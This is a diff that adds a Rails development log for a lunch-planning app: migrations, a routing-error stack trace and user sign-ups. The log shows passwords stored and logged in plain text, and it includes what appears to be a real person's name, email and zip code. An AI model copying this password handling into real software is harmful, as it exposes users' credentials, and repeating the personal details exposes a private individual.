@@ -1,0 +1,2106 @@
+# Logfile created on Fri Nov 26 15:18:42 -0500 2010  [4;36;1mSQL (0.2ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mCREATE DATABASE `lunchedin_production` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mSQL (0.3ms)[0m   [0mCREATE DATABASE `lunchedin_development` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mCREATE DATABASE `lunchedin_test` DEFAULT CHARACTER SET `utf8` COLLATE `utf8_general_ci`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (80.2ms)[0m   [0mCREATE TABLE `schema_migrations` (`version` varchar(255) NOT NULL) ENGINE=InnoDB[0m
+  [4;36;1mSQL (231.7ms)[0m   [0;1mCREATE UNIQUE INDEX `unique_schema_migrations` ON `schema_migrations` (`version`)[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSHOW TABLES[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT version FROM schema_migrations[0m
+Migrating to CreateUsers (1)
+  [4;35;1mSQL (127.5ms)[0m   [0mCREATE TABLE `users` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `first_name` varchar(255), `last_name` varchar(255), `username` varchar(255), `password` varchar(255), `email` varchar(255), `zip_code` varchar(255), `role_id` int(11) DEFAULT 2, `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('1')[0m
+Migrating to CreateVenues (2)
+  [4;35;1mSQL (112.2ms)[0m   [0mCREATE TABLE `venues` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `address_one` varchar(255), `address_two` varchar(255), `city` varchar(255), `state` varchar(255), `zip_code` varchar(255), `phone_number` varchar(255), `fax_number` varchar(255), `price` int(11) DEFAULT 2, `ratings_count` int(11) DEFAULT 0, `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('2')[0m
+Migrating to CreateEvents (3)
+  [4;35;1mSQL (114.1ms)[0m   [0mCREATE TABLE `events` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `occurs_on` datetime, `status` varchar(255) DEFAULT 'planning', `notes` text, `user_id` int(11), `venue_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('3')[0m
+Migrating to CreateComments (4)
+  [4;35;1mSQL (112.4ms)[0m   [0mCREATE TABLE `comments` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `subject` varchar(255), `body` text, `commentable_id` int(11), `commentable_type` varchar(255), `user_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('4')[0m
+Migrating to CreateCategories (5)
+  [4;35;1mSQL (105.5ms)[0m   [0mCREATE TABLE `categories` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('5')[0m
+Migrating to CreateTags (6)
+  [4;35;1mSQL (96.5ms)[0m   [0mCREATE TABLE `tags` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('6')[0m
+Migrating to CreateTagsVenues (7)
+  [4;35;1mSQL (106.1ms)[0m   [0mCREATE TABLE `tags_venues` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `venue_id` int(11), `tag_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('7')[0m
+Migrating to CreateRatings (8)
+  [4;35;1mSQL (97.6ms)[0m   [0mCREATE TABLE `ratings` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `venue_id` int(11), `user_id` int(11), `score` int(11), `ratings_count` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('8')[0m
+Migrating to CreateAttendees (9)
+  [4;35;1mSQL (112.5ms)[0m   [0mCREATE TABLE `attendees` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `email` varchar(255), `status` varchar(255) DEFAULT 'invited', `event_id` int(11), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mINSERT INTO schema_migrations (version) VALUES ('9')[0m
+Migrating to CreateRoles (10)
+  [4;35;1mSQL (96.7ms)[0m   [0mCREATE TABLE `roles` (`id` int(11) DEFAULT NULL auto_increment PRIMARY KEY, `name` varchar(255), `created_at` datetime, `updated_at` datetime) ENGINE=InnoDB[0m
+  [4;36;1mRole Columns (1.4ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRole Exists (0.3ms)[0m   [0;1mSELECT `roles`.id FROM `roles` WHERE (`roles`.`name` = BINARY 'admin') LIMIT 1[0m
+  [4;35;1mRole Create (0.2ms)[0m   [0mINSERT INTO `roles` (`name`, `created_at`, `updated_at`) VALUES('admin', '2010-11-26 20:18:52', '2010-11-26 20:18:52')[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mCOMMIT[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRole Exists (0.2ms)[0m   [0;1mSELECT `roles`.id FROM `roles` WHERE (`roles`.`name` = BINARY 'user') LIMIT 1[0m
+  [4;35;1mRole Create (0.1ms)[0m   [0mINSERT INTO `roles` (`name`, `created_at`, `updated_at`) VALUES('user', '2010-11-26 20:18:52', '2010-11-26 20:18:52')[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mCOMMIT[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mINSERT INTO schema_migrations (version) VALUES ('10')[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT version FROM schema_migrations[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `attendees`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mSHOW KEYS FROM `attendees`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `categories`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `categories`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `categories`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.7ms)[0m   [0;1mdescribe `comments`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSHOW KEYS FROM `comments`[0m
+  [4;36;1mSQL (1.2ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (1.8ms)[0m   [0mdescribe `events`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `events`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (2.3ms)[0m   [0;1mdescribe `ratings`[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSHOW KEYS FROM `ratings`[0m
+  [4;36;1mSQL (53.6ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mdescribe `roles`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `roles`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+  [4;36;1mSQL (1.4ms)[0m   [0;1mdescribe `tags`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSHOW KEYS FROM `tags`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `tags_venues`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW KEYS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.2ms)[0m   [0;1mdescribe `users`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSHOW KEYS FROM `users`[0m
+  [4;36;1mSQL (1.1ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mSQL (1.7ms)[0m   [0mdescribe `venues`[0m
+  [4;36;1mSQL (1.1ms)[0m   [0;1mSHOW KEYS FROM `venues`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-11-26 15:58:14) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 15ms (View: 8, DB: 2) | 200 OK [http://localhost/users/new]
+
+
+Processing ApplicationController#index (for 127.0.0.1 at 2010-11-26 16:07:33) [GET]
+
+
+ActionController::RoutingError (No route matches "/profile/new" with {:method=>:get}):
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/routing/recognition_optimisation.rb:66:in `recognize_path'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/routing/route_set.rb:386:in `recognize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:182:in `handle_request'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:110:in `dispatch_unlocked'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:123:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:132:in `dispatch_cgi'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:39:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:76:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:159:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:282:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/command.rb:212:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load_without_new_constant_marking'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/servers/mongrel.rb:64
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/server.rb:49
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    script/server:3
+
+Rendering /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/layout.erb (not_found)
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-11-26 16:10:20) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"4fb64a02785956b862680ee91dab9768865085af", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"password", "username"=>"christine", "last_name"=>"Ragan", "password"=>"password", "email"=>"christinearagan@gmail.com", "first_name"=>"Christine"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'christine') LIMIT 1[0m
+  [4;36;1mUser Create (0.2ms)[0m   [0;1mINSERT INTO `users` (`created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('2010-11-26 21:10:20', '20148', '2010-11-26 21:10:20', 'christine', 2, 'Ragan', 'password', 'Christine', 'christinearagan@gmail.com')[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+Redirected to /users/5
+Completed in 11ms (DB: 2) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:10:20) [GET]
+  Parameters: {"id"=>"5"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.1ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 5) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 5) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.7ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 5 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 5) [0m
+Completed in 25ms (View: 17, DB: 2) | 200 OK [http://localhost/users/5]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT version FROM schema_migrations[0m
+Migrating to CreateUsers (1)
+Migrating to CreateVenues (2)
+Migrating to CreateEvents (3)
+Migrating to CreateComments (4)
+Migrating to CreateCategories (5)
+Migrating to CreateTags (6)
+Migrating to CreateTagsVenues (7)
+Migrating to CreateRatings (8)
+Migrating to CreateAttendees (9)
+Migrating to CreateRoles (10)
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT version FROM schema_migrations[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+  [4;36;1mSQL (1.4ms)[0m   [0;1mdescribe `attendees`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `attendees`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `categories`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mdescribe `categories`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `categories`[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `comments`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `comments`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `events`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `events`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (1.4ms)[0m   [0;1mdescribe `ratings`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `ratings`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `roles`[0m
+  [4;36;1mSQL (49.8ms)[0m   [0;1mSHOW KEYS FROM `roles`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+  [4;36;1mSQL (1.1ms)[0m   [0;1mdescribe `tags`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `tags`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `tags_venues`[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mSHOW KEYS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `users`[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mSHOW KEYS FROM `users`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `venues`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `venues`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-11-26 16:11:48) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 14ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-11-26 16:13:36) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"4fb64a02785956b862680ee91dab9768865085af", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"password", "username"=>"charlie", "last_name"=>"brown", "password"=>"password", "email"=>"cb@peanuts.com", "first_name"=>"charlie"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'charlie') LIMIT 1[0m
+  [4;36;1mUser Create (0.2ms)[0m   [0;1mINSERT INTO `users` (`created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('2010-11-26 21:13:36', '20148', '2010-11-26 21:13:36', 'charlie', 2, 'brown', 'password', 'charlie', 'cb@peanuts.com')[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mCOMMIT[0m
+Redirected to /users/6
+Completed in 73ms (DB: 2) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:13:41) [GET]
+  Parameters: {"id"=>"6"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.6ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 6 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 6) [0m
+Completed in 24ms (View: 16, DB: 3) | 200 OK [http://localhost/users/6]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-26 16:15:26) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.7ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Load (0.2ms)[0m   [0mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;36;1mVenue Columns (1.6ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (4.6ms)
+Rendered venues/_venue (0.2ms)
+Rendered venues/_venue (0.2ms)
+Completed in 22ms (View: 10, DB: 2) | 200 OK [http://localhost/venues]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:15:54) [GET]
+  Parameters: {"id"=>"6"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.5ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mCACHE (0.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;36;1mComment Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mSQL (0.7ms)[0m   [0mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 6 AND `comments`.commentable_type = 'User') [0m
+  [4;36;1mEvent Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
